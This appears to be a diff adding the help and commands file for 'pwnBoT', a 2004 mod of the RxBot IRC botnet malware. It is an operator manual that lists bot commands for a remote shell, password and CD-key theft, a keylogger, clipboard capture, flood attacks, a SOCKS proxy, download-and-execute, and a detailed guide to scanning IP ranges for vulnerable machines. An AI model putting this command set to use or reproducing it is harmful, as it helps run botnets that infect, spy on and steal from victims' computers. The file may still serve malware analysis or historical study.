@@ -1,0 +1,224 @@
+pwnBoT (RxBot SeminolePride Mod) VERSION: 0.1a(11.27.2004)
+~~~~~~~~~~~~[ HELP & COMMANDS FILE ]~~~~~~~~~~~~~
+
+NO I WONT TEACH YOU TO ATTACK ANY SERVER WITH THIS BOT
+DONT YOU EVEN ASK ME CAUSE MY ANSWER WILL ALWAYS BE NO.
+NOW IM WASTING 4 PERFECTLY GOOD LINES OF SPACE JUST TO
+TELL YOU NOT TO EVEN THINK ABOUT IT! - SeminolePride
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@ NO VARIABLE COMMANDS: @@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+*******************************************************
+*Random nick: -rndnick                                *
+*******************************************************
+*Make bot close: -die                                 *
+*******************************************************
+*Get bot version: -ver (or) -version                  *
+*******************************************************
+*Crash bot: -pwncr4ash                                *
+*******************************************************
+*Logout: -logout                                      *
+*******************************************************
+*Secure netshares & dcom: -secure                     *
+*******************************************************
+*UN-secure netshares & dcom: -unsecure                *
+*******************************************************
+*Scan statistics: -scanstats                          *
+*******************************************************
+*Reconnect to server: -reconnect (or) -rec            *
+*******************************************************
+*Disconnect from server: -disconnect (or) -dc         *
+*******************************************************
+*Find user/windows password: -findpass (or) -fp       *
+*******************************************************
+*View bot status: -status (or) -s                     *
+*******************************************************
+*View botid: -pwnid (or) -id                          *
+*******************************************************
+*View bot uptime: -uptime (or) -up                    *
+*******************************************************
+*View drive info: -driveinfo (or) -drv                *
+*******************************************************
+*View current scan ip: -currentip (or) -cip           *
+*******************************************************
+*Test DLL Files: -testdlls (or) -tdll                 *
+*******************************************************
+*Encrypt your text: -encrypt (or) -enc                *
+*******************************************************
+*Open remote shell: -opencmd (or) -ocmd               *
+*******************************************************
+*List bot threads: -threads (or) -t                   *
+*******************************************************
+*List aliases: -aliases (or) -al                      *
+*******************************************************
+*List processes: -procs (or) -ps                      *
+*******************************************************
+*List logged in users: -who (or) -ulist               *
+*******************************************************
+*Show bot log: -log (or) -lg                          *
+*******************************************************
+*Clear bot log: -pwnclearlg (or) -pclg                *
+*******************************************************
+*Network Information: -netinf (or) -ni                *
+*******************************************************
+*System Information: -sysinf (or) -si                 *
+*******************************************************
+*Remove bot: -FBI (or) -pwnrm                         *
+*******************************************************
+*Get CD keys: -getcdkeys (or) -gkeys                  *
+*******************************************************
+*Get clipboard data: -getclip (or) -gc                *
+*******************************************************
+*Flush ARP: -flusharp (or) -farp                      *
+*******************************************************
+*Flush DNS: -flushdns (or) -flushdns                  *
+*******************************************************
+*Turn ON SOCKS4 server: -socks4                       *
+*******************************************************
+*Turn OFF SOCKS4 server: -socks4stop                  *
+*******************************************************
+*Turn ON remote login: -rloginserver (or) -rlogin     *
+*******************************************************
+*Turn OFF remote login: -rloginstop                   *
+*******************************************************
+*Turn ON TFTP Daemon: -tftpserver (or) -tftp          *
+*******************************************************
+*Turn OFF TFTP Daemon: -tftpstop                      *
+*******************************************************
+*Turn ON HTTP Daemon: -httpserver (or) -http          *
+*******************************************************
+*Turn OFF HTTP Daemon: -httpstop                      *
+*******************************************************
+*Cancel FTP Transer: -ftpstop                         *
+*******************************************************
+*Turn OFF redirect: -redirectstop                     *
+*******************************************************
+*Stop SYN flood: -synstop                             *
+*******************************************************
+*Stop/Close remote cmd: -cmdstop                      *
+*******************************************************
+*Stop UDP flood: -udpstop                             *
+*******************************************************
+*Stop PING flood: -pingstop                           *
+*******************************************************
+*Stop FindFile: -findfilestop (or) -ffstop            *
+*******************************************************
+*Stop Process fist: -procsstop (or) -psstop           *
+*******************************************************
+*Stop/Kill clones: -clonestop                         *
+*******************************************************
+*Stop secure: -securestop                             *
+*******************************************************
+*Stop scanning: -scanstop                             *
+*******************************************************
+*Stop logging: -logstop                               *
+*******************************************************
+*OP owner: -opme                                      *
+*******************************************************
+*DEOP owner: -deopme                                  *
+*******************************************************
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@ 1 VARIABLE COMMANDS: @@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+*******************************************************
+*Login: -pwnd password  (or) -iamg0d password         *
+*******************************************************
+*Set Prefix: -prefix newprefix (1 character only)     *
+*******************************************************
+*Join a channel: -join #channel                       *
+*******************************************************
+*Part a channel: -part #channel                       *
+*******************************************************
+*OP user in channel: -op nick                         *
+*******************************************************
+*DEOP user in channel: -deop nick                     *
+*******************************************************
+*HALFOP user in channel: -hop nick                    *
+*******************************************************
+*DEHALFOP user in channel: -dehop nick                *
+*******************************************************
+*VOICE user in channel: -vop nick                     *
+*******************************************************
+*DEVOICE user in channel -devop nick                  *
+*******************************************************
+*Remove all modes from user in channel: -deall nick   *
+*******************************************************
+*Kill a thread: -killthread threadnumber              *
+*******************************************************
+*Open a file: -open filename                          *
+*******************************************************
+*Switch Server: -server newserver                     *
+*******************************************************
+*Dns a host/ip: -dns hostorip                         *
+*******************************************************
+*Kill a process by name: -killproc processname        *
+*******************************************************
+*Kill a process by ID: -killid processid              *
+*******************************************************
+*Delete a file: -delete filename                      *
+*******************************************************
+*Send a file to owner via DCC: -dccget file           *
+*******************************************************
+*Send a file to a user via DCC: -dccsend file         *
+*******************************************************
+*List files in a directory: -list directory           *
+*******************************************************
+*Visit a site secretly: -visit sitehere               *
+*******************************************************
+*read a file to owner: -readfile file                 *
+*******************************************************
+*Turn on IDENT Daemon: -ident on                      *
+*******************************************************
+*Turn off IDENT Daemon: -ident off                    *
+*******************************************************
+*Turn on keylogger: -keylog on                        *
+*******************************************************
+*Turn off keylogger: -keylog off                      *
+*******************************************************
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@ 2 VARIABLE COMMANDS: @@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+*******************************************************
+*Send private message: -pm user message               *
+*******************************************************
+*Cycle a channel: -cycle channel                      *
+*******************************************************
+*Update bot: -pwnupdeyt hostedfile where2save botid   *
+*must be a botid different from the current one and   *
+*must be the one going to be used in the new bot      *
+*******************************************************
+*rename/move a file: -rename fileold filenew          *
+*******************************************************
+*Download file: -pdl hostedfile where2save number     *
+*Put 1 to run the file after downloading it...        *
+*Put 0 to NOT run the file after downloading it...    *
+*******************************************************
+*Scan for vulnerable PC's: Full Command Below  ;)     * 
+* -pwnscan exploit threads delay time ip flags        *
+*to view the list of exploits do the following:       *
+* -scanstats <- keep in mind that the names are case  *
+*sensitive, so ntpass is EXACTLY that way! threads    *
+*is how many sockets should be opened for the scan    *
+*they are normally set to 100 or 150. delay is how    *
+*much to delay in seconds before the next amount of   *
+*threads is loaded... this is normally set to 5-9     *
+*keep in mind the higher the number the slower the    *
+*scan goes, but also becomes more accurate. The       *
+*current flags supported are: "-r", "-a", and "-b"    *
+*The scanner can scan 3 different ways... these flags *
+*are what tell the scanner how to scan. The -r flag   *
+* tells the scanner it should scan in a random form   *
+*therefore your ip will have the letter x in place of *
+*the part of the ip range in which you wish to scan   *
+*EXAMPLE: 24.x.x.x -r (this will scan the 24. range   *
+*RANDOMLY!) The -b flag will make the scanner scan    *
+*squentially, therefore you enter a real ip address   *
+*to begin scanning from. EXAMPLE: 24.0.0.0 -b         *
+*(this will scan the 24. range in order.) The -a flag *
+*means to scan the WHOLE range, therefore you must    *
+*enter a valid range number. EXAMPLE: 24.56.0.0 -a -b *
+*or -24.56.x.x -a -r will scan the whole 24.56 range. *
+*Keep in mind you CAN mix the -a and -b or -a and -r  *
+*but NEVER mix the -r and -b!!!                       *
+*******************************************************
